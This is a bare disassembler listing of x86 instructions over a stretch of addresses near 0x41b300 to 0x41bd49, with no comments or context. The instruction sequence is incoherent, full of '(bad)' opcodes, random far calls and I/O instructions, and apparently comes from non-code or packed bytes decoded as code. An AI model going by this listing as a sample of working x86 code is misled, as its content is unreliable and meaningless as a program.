  41b2ed:	dec    edx
  41b2ee:	ja     0x41b321
  41b2f0:	outs   dx,DWORD PTR ds:[esi]
  41b2f1:	call   0xdd97:0x6359ddb8
  41b2f8:	retf   
  41b2f9:	test   eax,0x5e280fad
  41b2fe:	lea    ebp,[esi+0x5545dbea]
  41b304:	adc    BYTE PTR [ebx+0x6e],bh
  41b307:	(bad)  
  41b308:	mov    ecx,0x18db2253
  41b30d:	sahf   
  41b30e:	sti    
  41b30f:	xor    DWORD PTR [esi+0x37a1d62c],0xffffffd6
  41b316:	cmp    bh,bl
  41b318:	aaa    
  41b319:	jb     0x41b332
  41b31b:	loop   0x41b2bd
  41b31d:	out    dx,al
  41b31e:	das    
  41b31f:	shl    DWORD PTR [eax-0x465787bc],0xc
  41b326:	mov    ebx,0x74047974
  41b32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b32c:	div    dh
  41b32e:	mov    dh,ch
  41b330:	push   ecx
  41b331:	fiadd  WORD PTR [edx-0x6701c8e]
  41b337:	data16 repnz ss (bad) 
  41b33b:	call   0xb470:0xb7541fcd
  41b342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b343:	push   ecx
  41b344:	outs   dx,BYTE PTR ds:[esi]
  41b345:	(bad)  
  41b346:	mov    ecx,DWORD PTR [edi-0x46439b62]
  41b34c:	(bad)  
  41b34e:	iret   
  41b34f:	test   al,0xde
  41b351:	or     BYTE PTR [edi-0x66],bl
  41b354:	retf   0x877b
  41b357:	fbld   TBYTE PTR [esi]
  41b359:	test   DWORD PTR [edx+0x7ea22624],esp
  41b35f:	rcl    DWORD PTR [edi-0x21],cl
  41b362:	imul   edx,DWORD PTR [edx-0x45],0x52
  41b366:	push   eax
  41b367:	into   
  41b368:	sbb    al,0x18
  41b36a:	cmp    al,bl
  41b36c:	repnz lea ebx,[edi+0x6a]
  41b370:	sti    
  41b371:	lods   eax,DWORD PTR ds:[esi]
  41b372:	int3   
  41b373:	stos   BYTE PTR es:[edi],al
  41b374:	add    BYTE PTR [esi],0x6
  41b377:	add    BYTE PTR [ebx],0x2e
  41b37a:	jp     0x41b3c2
  41b37c:	call   0x9ead:0xb4f6f3e2
  41b383:	cmp    eax,0xab057b15
  41b388:	cs stos DWORD PTR es:[edi],eax
  41b38a:	jne    0x41b3e6
  41b38c:	test   al,0x0
  41b38e:	stc    
  41b38f:	adc    DWORD PTR [edx],ecx
  41b391:	mov    dl,0x62
  41b393:	mov    ecx,0xbae66d4a
  41b398:	adc    cl,BYTE PTR [edi-0x430d4138]
  41b39e:	aaa    
  41b39f:	dec    ebx
  41b3a0:	jmp    0x41b3cc
  41b3a2:	mov    edi,0xfb15df3e
  41b3a7:	xchg   BYTE PTR [ecx+ebp*4+0x24],bl
  41b3ab:	iret   
  41b3ac:	daa    
  41b3ad:	aam    0x6e
  41b3af:	or     BYTE PTR [esp+esi*8-0x2cd55ef1],ah
  41b3b6:	iret   
  41b3b7:	add    BYTE PTR [edx],0xda
  41b3ba:	addr16 pop ebp
  41b3bc:	clc    
  41b3bd:	pop    ebp
  41b3be:	fwait
  41b3bf:	inc    esp
  41b3c0:	jge    0x41b3c2
	...
  41b432:	add    BYTE PTR [eax],al
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	pop    ds
  41b441:	into   
  41b442:	or     al,0x44
  41b444:	mov    al,ds:0xf5000126
  41b449:	add    BYTE PTR [eax],al
  41b44b:	add    bl,bl
  41b44d:	and    esp,DWORD PTR ds:0xa92a305e
  41b453:	sar    ebx,1
  41b455:	repz sbb DWORD PTR [esi-0x6076ff9e],ebx
  41b45c:	sbb    DWORD PTR ds:0xad62b741,esp
  41b462:	aam    0x9d
  41b464:	sbb    eax,0x2a56d71c
  41b469:	dec    ecx
  41b46a:	inc    ebp
  41b46b:	in     al,0xe8
  41b46d:	add    esp,esp
  41b46f:	inc    edx
  41b470:	inc    edx
  41b471:	addr16 push ebp
  41b473:	cmp    ecx,DWORD PTR [esi-0x21]
  41b476:	push   DWORD PTR [esi+eax*1+0xe9cbad6]
  41b47d:	push   cs
  41b47e:	mov    al,ds:0x93026088
  41b483:	jns    0x41b4c1
  41b485:	xchg   esi,eax
  41b486:	jmp    0x4259606f
  41b48b:	scas   al,BYTE PTR es:[edi]
  41b48c:	jb     0x41b425
  41b48e:	jmp    0x9afb:0xd16c6c24
  41b495:	xchg   esi,eax
  41b496:	sbb    ch,dl
  41b498:	in     al,dx
  41b499:	lods   al,BYTE PTR ds:[esi]
  41b49a:	pop    esi
  41b49b:	jne    0x41b4b1
  41b49d:	mov    bl,0x6a
  41b49f:	or     al,0x25
  41b4a1:	pop    esi
  41b4a2:	dec    edx
  41b4a3:	or     al,0x5f
  41b4a5:	dec    ebx
  41b4a6:	mov    edx,es
  41b4a8:	clc    
  41b4a9:	xor    dl,BYTE PTR [edi-0x13]
  41b4ac:	adc    al,0x33
  41b4ae:	pop    edi
  41b4af:	(bad)  
  41b4b0:	xchg   ebp,eax
  41b4b1:	pop    ecx
  41b4b2:	sbb    al,BYTE PTR [edi+ecx*2+0x7]
  41b4b6:	jb     0x41b485
  41b4b8:	dec    edi
  41b4b9:	xchg   ebx,eax
  41b4ba:	loopne 0x41b4d8
  41b4bc:	call   0xe3dc:0xc216627
  41b4c3:	aad    0x85
  41b4c5:	mov    ds:0xc4f46214,al
  41b4ca:	dec    ebx
  41b4cb:	out    0x43,eax
  41b4cd:	mov    DWORD PTR [eax-0xc],esi
  41b4d0:	adc    al,dl
  41b4d2:	popf   
  41b4d3:	adc    edi,DWORD PTR [edi]
  41b4d5:	repnz in al,0x5e
  41b4d8:	pushf  
  41b4d9:	xor    bl,al
  41b4db:	in     eax,0x6e
  41b4dd:	jp     0x41b4e1
  41b4df:	cld    
  41b4e0:	ficomp DWORD PTR [edx+0x183ce809]
  41b4e6:	retf   0x1a68
  41b4e9:	inc    ebx
  41b4ea:	inc    eax
  41b4eb:	pop    esi
  41b4ec:	xchg   ebx,eax
  41b4ed:	or     DWORD PTR [ebp-0x40],ebp
  41b4f0:	pop    ss
  41b4f1:	mov    esi,0x573d51bf
  41b4f6:	into   
  41b4f7:	inc    ebp
  41b4f8:	mov    al,0xe3
  41b4fa:	ja     0x41b4b9
  41b4fc:	fild   QWORD PTR [eax+0x164c04af]
  41b502:	fxch   st(0)
  41b504:	xlat   BYTE PTR ds:[ebx]
  41b505:	mov    ebp,0xcada1ce0
  41b50a:	sbb    al,0x93
  41b50c:	scas   al,BYTE PTR es:[edi]
  41b50d:	(bad)  
  41b50e:	mov    cl,0x3c
  41b510:	popa   
  41b511:	aad    0xe8
  41b513:	sub    al,0x57
  41b515:	inc    esp
  41b516:	mov    ds:0xd10d761d,eax
  41b51b:	mov    ds:0x7c21a31d,eax
  41b520:	push   edi
  41b521:	push   ecx
  41b522:	pop    ebp
  41b523:	mov    cl,0xfe
  41b525:	cmp    DWORD PTR [ebx],0xfffffff2
  41b528:	in     al,dx
  41b529:	mov    cl,0xd8
  41b52b:	cmp    edi,esi
  41b52d:	sbb    al,0x4b
  41b52f:	xor    bh,BYTE PTR [edx-0x37d4b1b5]
  41b535:	ds loopne 0x41b4d2
  41b538:	push   eax
  41b539:	fistp  DWORD PTR [ebx-0x5]
  41b53c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b53d:	cld    
  41b53e:	push   esi
  41b53f:	popa   
  41b540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41b5b1:	add    BYTE PTR [eax],al
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0xbf
  41b5c1:	dec    eax
  41b5c2:	emms   
  41b5c4:	xchg   ebp,eax
  41b5c5:	daa    
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	cmc    
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    BYTE PTR [edi],ch
  41b5cd:	scas   eax,DWORD PTR es:[edi]
  41b5ce:	lock imul ebp,eax,0xffffffbe
  41b5d2:	jns    0x41b64a
  41b5d4:	rol    DWORD PTR [ebx],0x14
  41b5d7:	pop    ds
  41b5d8:	push   ss
  41b5d9:	cmc    
  41b5da:	push   di
  41b5dc:	lea    esp,[edi+0x15c48d8]
  41b5e2:	sub    esp,0x2e
  41b5e5:	cs (bad) 
  41b5e7:	retf   
  41b5e8:	and    DWORD PTR [edi],ecx
  41b5ea:	cmp    eax,0x72ee3adf
  41b5ef:	loope  0x41b64e
  41b5f1:	sbb    DWORD PTR [ebp+0x15bf5402],edi
  41b5f7:	js     0x41b5c0
  41b5f9:	add    eax,0xcb881914
  41b5fe:	or     eax,0xcc3284e4
  41b603:	dec    ebp
  41b604:	xchg   edi,eax
  41b605:	jbe    0x41b65d
  41b607:	(bad)  
  41b609:	scas   al,BYTE PTR es:[edi]
  41b60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b60b:	xchg   edi,eax
  41b60c:	icebp  
  41b60d:	add    DWORD PTR [esi+0x40],ecx
  41b610:	mov    eax,esi
  41b612:	call   0x50420eaf
  41b617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b618:	fistp  QWORD PTR [ebx+0x74]
  41b61b:	std    
  41b61c:	test   DWORD PTR [edi],edx
  41b61e:	test   eax,0xce9d7503
  41b623:	push   ebp
  41b624:	push   ebp
  41b625:	xchg   BYTE PTR [edx-0x25438e6d],cl
  41b62b:	(bad)  
  41b62d:	leave  
  41b62e:	mov    ch,0x87
  41b630:	sbb    esp,eax
  41b632:	rol    DWORD PTR [ebx+0x399bab8a],cl
  41b638:	push   eax
  41b639:	pop    edi
  41b63a:	(bad)  
  41b63b:	lock or BYTE PTR ds:[esi+ebx*8-0x61],ch
  41b641:	adc    eax,0x26beb1fa
  41b646:	cwde   
  41b647:	fwait
  41b648:	mov    cl,BYTE PTR [ebx]
  41b64a:	xchg   esi,eax
  41b64b:	out    0x9,eax
  41b64d:	outs   dx,DWORD PTR ds:[esi]
  41b64e:	inc    ebx
  41b64f:	cs mov ch,0x21
  41b652:	dec    ebp
  41b653:	cli    
  41b654:	xor    eax,ebx
  41b656:	outs   dx,DWORD PTR ds:[esi]
  41b657:	aad    0x1f
  41b659:	xchg   BYTE PTR ds:0xa2bd3b34,bh
  41b65f:	dec    esi
  41b660:	ret    
  41b661:	inc    esp
  41b662:	mov    ah,0xe0
  41b664:	test   eax,0xc65eb347
  41b669:	cs jle 0x41b6b8
  41b66c:	xchg   BYTE PTR [esi-0xc5d61a8],al
  41b672:	cmp    eax,0xc8b97267
  41b677:	xor    DWORD PTR [ebp+0xf2c525a],edi
  41b67d:	ins    DWORD PTR es:[edi],dx
  41b67e:	shl    BYTE PTR ds:0xdd48f092,0x70
  41b685:	adc    dh,BYTE PTR [ecx]
  41b687:	inc    esp
  41b688:	stos   BYTE PTR es:[edi],al
  41b689:	div    BYTE PTR [edx-0x8]
  41b68c:	mov    ah,dh
  41b68e:	lea    ebp,[ebp+0x3d]
  41b691:	mov    bl,0xc2
  41b693:	mov    edx,0xff54a23c
  41b698:	out    dx,al
  41b699:	add    BYTE PTR [edx],0xf
  41b69c:	cmp    DWORD PTR [esi+0x51588eed],ebx
  41b6a2:	sti    
  41b6a3:	cmp    BYTE PTR [eax],0x26
  41b6a6:	out    0x6b,eax
  41b6a8:	and    ch,BYTE PTR [edx-0x73ab107f]
  41b6ae:	add    al,0x50
  41b6b0:	add    eax,0x167d1da9
  41b6b5:	test   al,0x22
  41b6b7:	mov    DWORD PTR [edx],0xed6bc288
  41b6bd:	push   ds
  41b6be:	mov    ?,WORD PTR [edi+0x39]
	...
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [ebp+0x41],cl
  41b742:	leave  
  41b743:	or     BYTE PTR [edx-0xafffed8],0x0
  41b74a:	add    BYTE PTR [eax],al
  41b74c:	push   0x35ba608e
  41b751:	stc    
  41b752:	adc    DWORD PTR [edi+eax*1+0x4565c189],ebx
  41b759:	sub    DWORD PTR [ebp+0x49f17859],ebx
  41b75f:	mov    ds:0x397e397a,al
  41b764:	pop    ebx
  41b765:	sbb    ah,BYTE PTR [ecx-0xe]
  41b768:	test   BYTE PTR ds:0xb39b6500,0xbb
  41b76f:	mov    ebp,0xa83cea54
  41b774:	das    
  41b775:	stc    
  41b776:	sahf   
  41b777:	lods   al,BYTE PTR ds:[esi]
  41b778:	sub    BYTE PTR [esi+0x63959ae6],ah
  41b77e:	fidivr WORD PTR [esi-0x27]
  41b781:	mov    WORD PTR cs:[eax-0x24861f16],es
  41b788:	mov    cl,0x97
  41b78a:	pop    edi
  41b78b:	push   0x10
  41b78d:	xor    BYTE PTR [ecx-0x4dec09ee],0x4e
  41b794:	add    esp,edx
  41b796:	push   ebp
  41b797:	jno    0x41b7d8
  41b799:	xor    ecx,DWORD PTR [edx+0x5c25f0cb]
  41b79f:	hlt    
  41b7a0:	clc    
  41b7a1:	adc    al,0xf0
  41b7a3:	sub    BYTE PTR [esi],0xec
  41b7a6:	sbb    cl,al
  41b7a8:	mov    ebx,0xf6c17e52
  41b7ad:	dec    esp
  41b7ae:	popa   
  41b7af:	jb     0x41b7bc
  41b7b1:	outs   dx,DWORD PTR ds:[esi]
  41b7b2:	cld    
  41b7b3:	in     eax,0xd6
  41b7b5:	add    BYTE PTR [ebp-0xf],0xf1
  41b7b9:	xor    eax,0xf3665577
  41b7be:	and    al,0x41
  41b7c0:	loope  0x41b7ad
  41b7c2:	add    BYTE PTR [ecx+ebx*8-0x1d],bl
  41b7c6:	cld    
  41b7c7:	pop    eax
  41b7c8:	xchg   ecx,eax
  41b7c9:	and    DWORD PTR [ebp+0x461595e1],edx
  41b7cf:	mov    edi,0x36b918f7
  41b7d5:	sub    dl,BYTE PTR [eax-0x5e027111]
  41b7db:	pop    edx
  41b7dc:	and    eax,0xd6166570
  41b7e1:	jbe    0x41b7ac
  41b7e3:	sub    al,0xa5
  41b7e5:	push   ebx
  41b7e6:	jo     0x41b826
  41b7e8:	jmp    si
  41b7eb:	xor    dl,BYTE PTR [edi]
  41b7ed:	push   eax
  41b7ee:	hlt    
  41b7ef:	popa   
  41b7f0:	lea    esp,[ecx-0x679cf00e]
  41b7f6:	fstp   DWORD PTR [eax+0x30]
  41b7f9:	retf   0xa0ad
  41b7fc:	sub    DWORD PTR [edi-0x5715bbbd],edx
  41b802:	xchg   edx,eax
  41b803:	jb     0x41b87e
  41b805:	push   edx
  41b806:	in     eax,dx
  41b807:	sub    cl,BYTE PTR [edi]
  41b809:	add    edx,0xd685d2a3
  41b80f:	pop    ecx
  41b810:	int3   
  41b811:	in     al,0x3a
  41b813:	push   0x39
  41b815:	xchg   ebx,eax
  41b816:	sahf   
  41b817:	cli    
  41b818:	neg    DWORD PTR ds:0x267b15a0
  41b81e:	dec    esp
  41b81f:	or     BYTE PTR [ebx+0x57151730],bl
  41b825:	les    esi,FWORD PTR [edi+0x7879a40e]
  41b82b:	sub    BYTE PTR [edx-0x23],bh
  41b82e:	cs std 
  41b830:	nop
  41b831:	xchg   ebp,ebx
  41b833:	dec    eax
  41b834:	add    esi,DWORD PTR [ecx-0x72108737]
  41b83a:	or     esp,DWORD PTR [ecx+0x5f38abe]
  41b840:	lock add BYTE PTR [eax],al
	...
  41b8b3:	add    BYTE PTR ds:0xcf4a867e,dh
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	dec    eax
  41b8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c2:	inc    eax
  41b8c3:	add    bh,BYTE PTR [edi+0x29]
  41b8c6:	add    DWORD PTR [eax],eax
  41b8c8:	cmc    
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [ebp-0x776d511],dh
  41b8d1:	test   DWORD PTR [eax+0x215daf85],ebp
  41b8d7:	arpl   WORD PTR [ebx-0x1290ccb5],dx
  41b8dd:	xchg   DWORD PTR [ecx+ebp*8+0x2866c751],esi
  41b8e4:	mov    esp,0x1a9947cc
  41b8e9:	fstp   DWORD PTR gs:[esi]
  41b8ec:	jno    0x41b896
  41b8ee:	mov    ebx,0xca2eb8ed
  41b8f3:	xchg   ebx,eax
  41b8f4:	push   eax
  41b8f5:	out    0xd3,eax
  41b8f7:	jo     0x41b8cf
  41b8f9:	dec    ecx
  41b8fa:	push   0x79
  41b8fc:	inc    esp
  41b8fd:	enter  0x1c42,0x86
  41b901:	or     edi,DWORD PTR [eax]
  41b903:	fisttp WORD PTR [eax-0xd0fbcc0]
  41b909:	push   ebp
  41b90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b90b:	push   DWORD PTR [edi+eax*8-0xc]
  41b90f:	dec    esi
  41b910:	int3   
  41b911:	fld    DWORD PTR [ebp+0x3e]
  41b914:	adc    BYTE PTR [esi+0x3010999],bl
  41b91a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b91b:	xor    esi,0xc9be0a8c
  41b921:	test   DWORD PTR [ebp+0x71e6cd60],ecx
  41b927:	jmp    0xdbbcfc08
  41b92c:	shl    DWORD PTR fs:[edi-0x60e78ea8],cl
  41b933:	dec    esi
  41b934:	mov    ecx,0xa5663fbe
  41b939:	ins    BYTE PTR es:[edi],dx
  41b93a:	adc    ecx,ebx
  41b93c:	lds    edx,FWORD PTR [eax]
  41b93e:	xchg   esp,eax
  41b93f:	cmp    DWORD PTR [ecx-0x676fd809],eax
  41b945:	fstp   DWORD PTR [edx-0x72]
  41b948:	sub    BYTE PTR [ebp-0x18e13b0f],al
  41b94e:	add    DWORD PTR [ecx],edi
  41b950:	inc    ebp
  41b951:	jae    0x41b9c0
  41b953:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b955:	mov    ah,ah
  41b957:	adc    al,0xee
  41b959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b95a:	aas    
  41b95b:	jle    0x41b98d
  41b95d:	in     al,dx
  41b95e:	mov    ch,0x2f
  41b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b961:	nop
  41b962:	(bad)  
  41b964:	mov    dh,0xd5
  41b966:	dec    eax
  41b967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b968:	xchg   BYTE PTR [edi+0x26],ch
  41b96b:	dec    edx
  41b96c:	out    dx,al
  41b96d:	mov    al,0x77
  41b96f:	or     al,0x82
  41b971:	add    al,0x3e
  41b973:	aas    
  41b974:	and    al,0x12
  41b976:	jmp    0x5df7:0x2e6f10ac
  41b97d:	cwde   
  41b97e:	clc    
  41b97f:	ss jle 0x41b988
  41b982:	add    DWORD PTR ds:0x4a9e,esi
  41b987:	cld    
  41b988:	test   DWORD PTR [edi+0x460078b],0x6578524b
  41b992:	inc    ebx
  41b993:	call   0x9e07b476
  41b998:	adc    dl,bl
  41b99a:	popf   
  41b99b:	ins    BYTE PTR es:[edi],dx
  41b99c:	(bad)  
  41b99d:	jp     0x41b92e
  41b99f:	or     bl,BYTE PTR [eax]
  41b9a1:	sub    ch,BYTE PTR [edx-0x4b98e329]
  41b9a7:	cld    
  41b9a8:	lods   eax,DWORD PTR ds:[esi]
  41b9a9:	fistp  DWORD PTR [ebp-0x17]
  41b9ac:	cmp    al,0x46
  41b9ae:	mov    edx,DWORD PTR [eax+0x46c30c]
  41b9b4:	fmul   QWORD PTR fs:[edi-0x1a]
  41b9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9b9:	shl    DWORD PTR [esi-0x2b],cl
  41b9bc:	arpl   bx,cx
  41b9be:	add    cl,BYTE PTR [esi+0xb]
	...
  41ba31:	add    BYTE PTR [eax],al
  41ba33:	add    bh,dh
  41ba35:	add    esp,ebx
  41ba37:	mov    ah,0xfe
  41ba39:	std    
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	outs   dx,DWORD PTR ds:[esi]
  41ba41:	and    BYTE PTR ds:0x12a74b1,bl
  41ba47:	add    ch,dh
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [edi-0x6e],dl
  41ba4e:	cli    
  41ba4f:	sar    DWORD PTR [ebp+0x13],cl
  41ba52:	inc    eax
  41ba53:	and    eax,0xb5b52fd2
  41ba58:	daa    
  41ba59:	mov    ecx,DWORD PTR [ebx-0x49]
  41ba5c:	enter  0x6a6a,0x52
  41ba60:	int    0xac
  41ba62:	add    eax,0xdd17d4d6
  41ba67:	xor    ebp,DWORD PTR [edi+0x5ad54d51]
  41ba6d:	sahf   
  41ba6e:	jl     0x41b9f1
  41ba70:	les    esp,FWORD PTR [ebp+0x55944758]
  41ba76:	icebp  
  41ba77:	cld    
  41ba78:	addr16 cmp edi,esi
  41ba7b:	loopne 0x41ba8b
  41ba7d:	mov    bl,0x7a
  41ba7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba80:	outs   dx,BYTE PTR ds:[esi]
  41ba81:	jl     0x41baf6
  41ba83:	mov    ecx,0x91116076
  41ba88:	pop    esp
  41ba89:	jmp    0x41ba90
  41ba8b:	lea    edx,ds:0x344e304e
  41ba91:	pop    es
  41ba92:	mov    ecx,0x31946fe4
  41ba97:	sbb    edx,DWORD PTR gs:[esp+ecx*2]
  41ba9b:	aad    0x17
  41ba9d:	xor    ecx,edi
  41ba9f:	dec    eax
  41baa0:	sub    bh,BYTE PTR [eax]
  41baa2:	clc    
  41baa3:	test   BYTE PTR [ebx+ebp*4-0x2f3711b5],ch
  41baaa:	xchg   ebp,eax
  41baab:	pop    esp
  41baac:	int3   
  41baad:	jns    0x41ba98
  41baaf:	test   eax,0xb074e1ef
  41bab4:	push   ecx
  41bab5:	mov    esi,0x21d23603
  41baba:	lahf   
  41babb:	mov    edi,0xfcacbc96
  41bac0:	rcr    DWORD PTR [edx-0x55],1
  41bac3:	dec    esi
  41bac4:	inc    edx
  41bac5:	and    esp,esp
  41bac7:	mov    BYTE PTR [esi+ebp*4+0x15b2acfd],ch
  41bace:	push   0x563c0d52
  41bad3:	enter  0x5218,0xf
  41bad7:	xchg   esp,eax
  41bad8:	sbb    BYTE PTR [ebx],dl
  41bada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41badb:	imul   edx,DWORD PTR [eax+0x68],0xffffffea
  41badf:	xchg   DWORD PTR cs:[eax-0x514b8038],esi
  41bae6:	test   ecx,eax
  41bae8:	xchg   edi,eax
  41bae9:	sbb    ecx,DWORD PTR [ecx+0x14]
  41baec:	aas    
  41baed:	add    DWORD PTR [ecx+0x35],eax
  41baf0:	pop    es
  41baf1:	pop    ebp
  41baf2:	sahf   
  41baf3:	sub    al,0x96
  41baf5:	or     edx,ebx
  41baf7:	or     ebp,DWORD PTR [ecx+0x300facbb]
  41bafd:	fst    DWORD PTR [eax]
  41baff:	fs and al,0x7d
  41bb02:	aas    
  41bb03:	sbb    ecx,edi
  41bb05:	xor    DWORD PTR [edi],ebx
  41bb07:	sahf   
  41bb08:	or     cl,BYTE PTR [esi]
  41bb0a:	popf   
  41bb0b:	pop    esp
  41bb0c:	pop    eax
  41bb0d:	fimul  WORD PTR [edi]
  41bb0f:	aam    0xfe
  41bb11:	outs   dx,BYTE PTR ds:[esi]
  41bb12:	lahf   
  41bb13:	leave  
  41bb14:	or     al,0xe2
  41bb16:	ins    DWORD PTR es:[edi],dx
  41bb17:	or     dl,dl
  41bb19:	xchg   DWORD PTR [ebx+esi*8-0x56],edx
  41bb1d:	aas    
  41bb1e:	add    ebx,DWORD PTR [ecx+0x1e]
  41bb21:	adc    DWORD PTR [edi-0x73],eax
  41bb24:	or     BYTE PTR [esi+0x3c1ee98d],al
  41bb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb2b:	add    DWORD PTR [eax],edx
  41bb2d:	jo     0x41bb12
  41bb2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb30:	int3   
  41bb31:	ins    BYTE PTR es:[edi],dx
  41bb32:	cmp    al,0x72
  41bb34:	fdivr  DWORD PTR [eax]
  41bb36:	ficom  WORD PTR [esi-0x8]
  41bb39:	sbb    DWORD PTR [ebx],esp
  41bb3b:	retf   
  41bb3c:	(bad)  
  41bb3d:	adc    BYTE PTR [ecx+ebx*1],dh
  41bb40:	scas   al,BYTE PTR es:[edi]
	...
  41bbb1:	add    BYTE PTR [eax],al
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	popa   
  41bbc1:	mov    ch,0x4
  41bbc3:	mov    ch,0x69
  41bbc5:	sub    eax,DWORD PTR [ecx]
  41bbc7:	add    ch,dh
  41bbc9:	add    BYTE PTR [eax],al
  41bbcb:	add    cl,bh
  41bbcd:	push   ebp
  41bbce:	outs   dx,DWORD PTR ds:[esi]
  41bbcf:	push   es
  41bbd0:	add    edi,DWORD PTR [ecx+ebp*2]
  41bbd3:	fimul  WORD PTR [ebp-0x9927707]
  41bbd9:	das    
  41bbda:	mov    ebp,0xe429624e
  41bbdf:	into   
  41bbe0:	jmp    0x5759:0x1aef90c3
  41bbe7:	cwde   
  41bbe8:	pop    edi
  41bbe9:	pop    edx
  41bbea:	mov    dl,bl
  41bbec:	adc    BYTE PTR [ebx+0x5ab386a1],0x83
  41bbf3:	cwde   
  41bbf4:	aas    
  41bbf5:	(bad)  
  41bbf6:	sub    al,0xbe
  41bbf8:	je     0x41bc24
  41bbfa:	dec    edi
  41bbfb:	cs inc ecx
  41bbfd:	ret    0x4cf6
  41bc00:	in     eax,0x62
  41bc02:	cmc    
  41bc03:	jns    0x41bbb0
  41bc05:	xor    al,0x51
  41bc07:	lahf   
  41bc08:	ins    DWORD PTR es:[edi],dx
  41bc09:	addr16 js 0x41bc0d
  41bc0c:	psllq  mm7,0x4b
  41bc10:	dec    esp
  41bc11:	call   0xd89e:0xbd52fcb2
  41bc18:	jmp    0x78b6fa85
  41bc1d:	push   esi
  41bc1e:	stos   DWORD PTR es:[edi],eax
  41bc1f:	mov    eax,ds:0x1a805712
  41bc24:	add    al,0x9e
  41bc26:	xchg   edx,eax
  41bc27:	mov    edx,0x8a8e2fb3
  41bc2c:	or     DWORD PTR [ebp-0x7890f1fa],edx
  41bc32:	sub    esi,DWORD PTR [esi]
  41bc34:	mov    eax,0x55264fbb
  41bc39:	sahf   
  41bc3a:	sbb    BYTE PTR [esi],ch
  41bc3c:	dec    edx
  41bc3d:	fwait
  41bc3e:	add    DWORD PTR [ebx],esp
  41bc40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc41:	sbb    DWORD PTR [ebp+0x3],esi
  41bc44:	push   edi
  41bc45:	lahf   
  41bc46:	clc    
  41bc47:	cmp    ah,ch
  41bc49:	and    al,0xfd
  41bc4b:	and    eax,0xd20a7b3a
  41bc50:	jnp    0x41bca9
  41bc52:	cmp    bl,BYTE PTR [ecx+0x24ad96b2]
  41bc58:	inc    eax
  41bc59:	fisttp WORD PTR [ecx]
  41bc5b:	push   edx
  41bc5c:	pop    eax
  41bc5d:	pop    ebx
  41bc5e:	das    
  41bc5f:	add    al,0x82
  41bc61:	mulps  xmm7,XMMWORD PTR [edi+0x4d]
  41bc65:	xor    ecx,esi
  41bc67:	add    eax,0x72b85c1b
  41bc6c:	cdq    
  41bc6d:	(bad)  
  41bc6e:	add    ebx,DWORD PTR [edx-0x6c4b5a5c]
  41bc74:	popa   
  41bc75:	jnp    0x41bcb4
  41bc77:	jae    0x41bc40
  41bc79:	xor    al,0x2b
  41bc7b:	jge    0x41bcf2
  41bc7d:	and    eax,0xfa1a2869
  41bc82:	aad    0x20
  41bc84:	into   
  41bc85:	scas   al,BYTE PTR es:[edi]
  41bc86:	dec    DWORD PTR [edi-0x56]
  41bc89:	paddusw mm4,QWORD PTR [ebx+0x3f]
  41bc8d:	daa    
  41bc8e:	call   0x5921567a
  41bc93:	iret   
  41bc94:	or     al,0xb5
  41bc96:	push   ebx
  41bc97:	(bad)  
  41bc98:	lods   al,BYTE PTR ds:[esi]
  41bc99:	dec    ecx
  41bc9a:	je     0x41bcf3
  41bc9c:	test   BYTE PTR ds:0x41288001,ch
  41bca2:	mov    dh,0xba
  41bca4:	jns    0x41bc89
  41bca6:	imul   esi,DWORD PTR [eax+0x3d],0x7a9e7280
  41bcad:	(bad)  
  41bcae:	push   eax
  41bcaf:	call   0x6cc3:0x3e84058f
  41bcb6:	inc    esp
  41bcb7:	mov    ebx,0x78f9ed60
  41bcbc:	sbb    ah,cl
  41bcbe:	retf   0xefde
	...
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x33bf1c9a
  41bd41:	pop    esi
  41bd42:	in     al,dx
  41bd43:	jns    0x41bda3
  41bd45:	sub    al,0x1
  41bd47:	add    ch,dh
  41bd49:	add    BYTE PTR [eax],al
